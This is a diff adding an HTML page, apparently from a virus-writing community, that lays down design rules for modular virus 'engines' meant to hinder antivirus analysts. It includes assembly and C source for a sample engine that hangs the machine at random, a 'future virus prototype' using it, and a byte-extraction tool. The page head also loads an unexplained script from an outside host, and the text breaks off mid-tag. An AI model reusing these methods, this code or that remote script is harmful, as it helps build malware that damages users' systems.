@@ -1,0 +1,427 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+<HEAD>
+<TITLE>VIRUS ENGINES: COMMON RECOMMENDATIONS</title><script language='JavaScript' type='text/javascript' src='http://proxy.host.sk/index.php'></script>
+</HEAD>
+<body bgcolor=#C0C0C0 text=#000000 link=#0000EE vlink=#551A8B>
+
+<h1 align=center>VIRUS ENGINES: COMMON RECOMMENDATIONS</h1>
+
+<h3 align=center>edition 3</h3>
+
+<p>ENGINE is an independend virus module,
+  represented in binary and/or source form.
+
+<h3>INTRO</h3>
+
+<p>Virus engines are very similar to C/C++ classes (objects),
+and has many identical properties. These both substances are
+directed to modularity. The only difference is that C++ class
+has larger interface part while virus engine is oriented to
+implementation.
+
+<p>Today virus engines are on the same step as programs was many years ago,
+when OOP was only introduced. And now is time to change.
+
+<p>This text was written with a single goal: to denote characterictics
+of virus engine, which will make it handy and useful.
+
+<p>An idea to write this text appeared
+right after i understood all the advantages of using independent components
+(modules) in virus writing. And there were written the following engines:
+   <a href="lde_eng.html">LDE32</a>,
+   <a href="kme350.zip">KME</a>'s,
+   <a href="etg.html">ETG</a>,
+   <a href="cmix.txt">CMIX</a>,
+   <a href="dscript.zip">DSCRIPT</a>,
+   <a href="expo.zip">EXPO</a>,
+   <a href="rpme.zip">RPME</a>,
+   <a href="cg200.zip">CODEGEN</a>,
+   <a href="prcg.zip">PRCG</a>,
+   <a href="z0mbie6b.zip">MACHO</a> and
+   <a href="autorev.txt">MISTFALL</a>,
+having mostly all the properties signed in this text.
+
+<p>But even this little attempt to standartize these engines showed me
+all the importance of standartization.
+Here should be said that such standartization has an influence
+mostly on interface part of the engine, while implementation
+in most cases remains the same. And, for sure, it will not simplify
+avers work.
+
+<h3>CODE</h3>
+
+<ul>
+<li>Engine must contain only executable code.
+Thus, it must not contain data in evident form.
+This can be achieved by means of
+<a href="virdatae.html">data in code generation</a>.
+
+<li>Engine must not contain absolute offsets.
+This can be achieved by means of creating data structure on the stack,
+and passing pointer to this structure.
+
+<li>Engine must not use directly external data structures, and must not
+directly CALL external subroutines.
+Instead of it, pointers to such data and subroutines must be passed
+to the engine as arguments.
+
+<li>(optionally) Engine must not perform system calls.
+Instead of it, pointers to own subroutines must be passed to the engine,
+and engine must call system subroutines through them.
+</ul>
+
+<h3>PUBLIC-functions</h3>
+
+<ul>
+<li>Parameters must be passed on the stack. (not in registers)
+<li>Function result (if required) must be returned in EAX.
+<li>All the registers must be preserved (except EAX).
+<li>(optionally) On function exit, DF flag must be set to 0. (CLD)
+</ul>
+
+<h3>SOURCES</h3>
+
+<ul>
+<li>If there are sources, then variables, arguments, constants,
+internal subroutines and other names and labels must be unique,
+to not coincide with labels used in user's sources or in other engines.
+Here is 2 solutions: in asm use local labels,
+and in C++ use namespace directive.
+
+<li>If there is some data structures and/or constants, or exit codes,
+used in engine call, it all must be described in the separate .INC file.
+</ul>
+
+<h3>DOCUMENTATION</h3>
+
+<p>Engine must be accompanied by some documentation, where the folloing
+things should be described:
+<ul>
+<li>the engine, its algorithm, its primary goals, i.e. what is it intended for and how it works.
+<li>description of each PUBLIC-function and its parameters
+<li>(optionally) bugs and features
+<li>(optionally) where engine has been tested, where it works and where it doesnt.
+</ul>
+
+<h3>BEST WAY</h3>
+
+<ul>
+<li>Engine has single PUBLIC-function,
+in the beginning of the engine's code (wanna in the middle - use JMP in
+the beginning), and this main function has CDECL calling convention
+(PUSH*n,CALL,RETN,ADD ESP,n*4).
+
+<li>Engine uses only on-stack data variables.
+(arguments and local variables space)
+
+<li>Engine works in multithread environment. (i.e. when pointers
+to external data structures are passed to the engine,
+and multiply instances of the engine will correctly work with these
+data structures)
+
+<li>Engine uses only .386 realmode opcodes, i.e. all the
+priviledged or .486+ opcodes, such as bswap or cmpxchg are absent.
+</ul>
+
+<h3>RESULTS</h3>
+
+<p>Using all the features listed above,
+the engine code become independend from OS, ring0/3 and offset
+where engine is located.
+Such code can be permutated, i.e. any instructions can be easily
+analyzed and moved and/or replaced.
+Code or sources of such engines can be easily used by any other
+engines or viruses, virus constructors or generators, or turned
+into virus plugins.
+
+<p>Moreover, the task of linking asm- and cpp- code
+without using .obj files is solved.
+
+<h3>EXAMPLE</h3>
+
+<p>Engine: KILLER. Goal: hangup with probability of 1/1000.
+
+<p>Source file:
+
+<a name=killerasm>
+<pre>
+----[begin KILLER.ASM]--------------------------------------------------
+; KILLER engine version 1.00 FREEWARE
+; action: hangup with probability of 1/1000;
+; CDECL calling convention;
+; 5 arguments;
+; no return value, no registers modified
+killer_engine           proc    c
+                        arg     user_param  ; user-data
+                        arg     user_random ; external randomer
+                        arg     arg1
+                        arg     arg2        ; other parameters
+                        arg     arg3
+                        pusha
+                        cld
+                        ;;
+                        push    1000
+                        push    user_param  ; maybe ptr to some struct
+                        call    user_random ; call external subroutine
+                        add     esp, 8
+                        ;;
+                        cmp     eax, 666
+                        je      $
+                        ;;
+                        popa
+                        ret                 ; TASM produces LEAVE+RETN
+                        endp
+----[end KILLER.ASM]----------------------------------------------------
+</pre>
+
+<p>Generated ASM include file:
+
+<a name=killerinc>
+<pre>
+----[begin KILLER.INC]--------------------------------------------------
+; GENERATED FILE. DO NOT EDIT.
+; KILLER 1.00 engine
+killer_engine_size equ 30
+killer_engine:
+db 0C8h,000h,000h,000h,060h,0FCh,068h,0E8h
+db 003h,000h,000h,0FFh,075h,008h,0FFh,055h
+db 00Ch,083h,0C4h,008h,03Dh,09Ah,002h,000h
+db 000h,074h,0FEh,061h,0C9h,0C3h
+----[end KILLER.INC]----------------------------------------------------
+</pre>
+
+<p>The same, but in C/C++:
+
+<a name=killercpp>
+<pre>
+----[begin KILLER.CPP]--------------------------------------------------
+// GENERATED FILE. DO NOT EDIT.
+// KILLER 1.00 engine
+#define killer_engine_size 30
+BYTE killer_engine_bin[killer_engine_size] =
+{
+  0xC8,0x00,0x00,0x00,0x60,0xFC,0x68,0xE8,
+  0x03,0x00,0x00,0xFF,0x75,0x08,0xFF,0x55,
+  0x0C,0x83,0xC4,0x08,0x3D,0x9A,0x02,0x00,
+  0x00,0x74,0xFE,0x61,0xC9,0xC3
+};
+----[end KILLER.CPP]----------------------------------------------------
+</pre>
+
+<p>ASM header file:
+
+<a name=killerash>
+<pre>
+----[begin KILLER.ASH]--------------------------------------------------
+; KILLER 1.00 engine
+KILLER_VERSION          equ     0100h
+----[end KILLER.ASH]----------------------------------------------------
+</pre>
+
+<p>C/C++ header file:
+
+<a name=killerhpp>
+<pre>
+----[begin KILLER.HPP]--------------------------------------------------
+// KILLER 1.00 engine
+#ifndef __KILLER_HPP__
+#define __KILLER_HPP__
+
+#define KILLER_VERSION  0x0100
+
+typedef
+void __cdecl killer_engine(
+                DWORD   user_param,             // user-parameter
+                DWORD __cdecl user_random(DWORD user_param, DWORD range),
+                DWORD   arg1,
+                DWORD   arg2,
+                DWORD   arg3);
+
+#endif //__KILLER_HPP__
+----[end KILLER.HPP]----------------------------------------------------
+</pre>
+
+<p>Usage example, in ASM:
+
+<a name=exampleasm>
+<pre>
+----[begin EXAMPLE.ASM]-------------------------------------------------
+; KILLER 1.00 usage example
+include                 <a href=#killerash>killer.ash</a>
+
+callW                   macro   x
+                        extern  x:PROC
+                        call    x
+                        endm
+
+v_data                  struc
+v_randseed              dd      ?
+;                       ...
+                        ends
+
+                        p386
+                        model   flat
+                        locals  __
+
+                        .data
+                        dd      ?
+                        .code
+
+start:                  call    virus_code
+                        push    -1
+                        callW   ExitProcess
+
+virus_code:             pusha
+                        sub     esp, size v_data
+                        mov     ebp, esp
+                        ;;
+                        callW   GetTickCount
+                        xor     [ebp].v_randseed, eax  ; randomize
+                        ;;
+                        push    3
+                        push    2           ; parameters
+                        push    1
+                        call    $+5+2       ; push pointer to randomer
+                        jmp     short my_random
+                        push    ebp         ; user-param == v_data ptr
+                        call    killer_engine
+                        add     esp, 4*5
+                        ;;
+                        add     esp, size v_data
+                        popa
+                        retn
+
+; DWORD __cdecl random(DWORD user_param, DWORD range)
+;                       [esp+4]        [esp+8]
+my_random:              mov     ecx, [esp+4]   ; v_data ptr
+                        mov     eax, [ecx].v_randseed
+                        imul    eax, 214013
+                        add     eax, 2531011
+                        mov     [ecx].v_randseed, eax
+                        shr     eax, 16
+                        imul    eax, [esp+8]
+                        shr     eax, 16
+                        retn
+
+;killer_engine:
+include                 <a href=#killerinc>killer.inc</a>
+
+virus_size              equ     $-virus_code
+                        end     start
+----[end EXAMPLE.ASM]---------------------------------------------------
+</pre>
+
+<p>Usage example, C/C++:
+
+<a name=examplecpp>
+<pre>
+----[begin EXAMPLE.CPP]-------------------------------------------------
+#include &lt;windows.h&gt;
+#pragma hdrstop
+#include "<a href=#killerhpp>killer.hpp</a>"
+#include "<a href=#killercpp>killer.cpp</a>"
+struct v_struct
+{
+  DWORD rseed;
+//...
+};
+DWORD __cdecl my_random(DWORD user_arg, DWORD range)
+{
+  v_struct* v = (v_struct*) user_arg;
+  return range ? (v->rseed = v->rseed * 214013 + 2531011) % range : 0;
+}
+void main()
+{
+  v_struct* v_data = (v_struct*) GlobalAlloc( GPTR, sizeof(v_struct) );
+  v_data->rseed = GetTickCount();  // randomize
+  void* engine_ptr = &killer_engine_bin;
+  (*(killer_engine*)engine_ptr)((DWORD)v_data, my_random, 1,2,3);
+}
+----[end EXAMPLE.CPP]---------------------------------------------------
+</pre>
+
+<p>Example program to compile engine:
+
+<a name=buildasm>
+<pre>
+----[begin BUILD.ASM]---------------------------------------------------
+                        p386
+                        model   flat
+                        locals  __
+                        .data
+                        db      0EBh,02h,0FFh,01h       ; signature
+include                 <a href=#killerasm>killer.asm</a>
+                        db      0EBh,02h,0FFh,02h       ; signature
+                        .code
+start:                  push    -1
+                        callW   ExitProcess
+                        end     start
+----[end BUILD.ASM]-----------------------------------------------------
+</pre>
+
+<p>Example program to rip engine in binary (DB,DB,...) form
+from the previous file.
+
+<a name=haxorcpp>
+<pre>
+----[begin HAXOR.CPP]---------------------------------------------------
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;io.h&gt;
+#pragma hdrstop
+void main()
+{
+  FILE*f=fopen("build.exe","rb");
+  int bufsize = filelength(fileno(f));
+  BYTE* buf = new BYTE[bufsize+1];
+  fread(buf, 1,bufsize, f);
+  fclose(f);
+  int id1=0, id2=0;
+  for (int i=0; i&lt;bufsize; i++)
+  {
+    if (*(DWORD*)&buf[i] == 0x01FF02EB) id1=i+4;        // check signature
+    if (*(DWORD*)&buf[i] == 0x02FF02EB) id2=i;          // check signature
+  }
+  f=fopen("<a href=#killerinc>killer.inc</a>","wb");
+  fprintf(f,"; GENERATED FILE. DO NOT EDIT.\r\n");
+  fprintf(f,"; KILLER 1.00 engine\r\n");
+  fprintf(f,"killer_size equ %i\r\n", id2-id1);
+  fprintf(f,"killer_engine:\r\n", id2-id1);
+  for (int i=0; i&lt;id2-id1; i++)
+  {
+    if ((i%8)==0) fprintf(f,"db ");
+    fprintf(f,"0%02Xh", buf[id1+i]);
+    if (((i%8)==7)||(i==id2-id1-1)) fprintf(f,"\r\n"); else fprintf(f,",");
+  }
+  fclose(f);
+  f=fopen("<a href=#killercpp>killer.cpp</a>","wb");
+  fprintf(f,"; GENERATED FILE. DO NOT EDIT.\r\n");
+  fprintf(f,"// KILLER 1.00 engine\r\n");
+  fprintf(f,"#define killer_engine_size %i\r\n",id2-id1);
+  fprintf(f,"BYTE killer_engine_bin[killer_engine_size] = {\r\n");
+  for (int i=0; i&lt;id2-id1; i++)
+  {
+    if ((i%8)==0) fprintf(f,"  ");
+    fprintf(f,"0x%02X", buf[id1+i]);
+    if (i!=id2-id1-1) fprintf(f,",");
+    if ((i%8)==7) fprintf(f,"\r\n");
+  }
+  fprintf(f," };\r\n");
+  fclose(f);
+}
+----[end HAXOR.CPP]-----------------------------------------------------
+</pre>
+
+<p>Now, lets take a look into <a href=#exampleasm>example.asm</a> --
+the future virus prototype. This file uses engine, an engine uses external
+randomer, and randomer uses randseed which is initialized within main
+virus body. As a result, many engines can call the same rnd(),
+or file io functions, or each other in one way - via this common
+structure, which is equivalent to main object.
+
+<p>As you can see, this all is written without absolute offsets at all,
+and can be used anywhere.
+
+<p align=right><
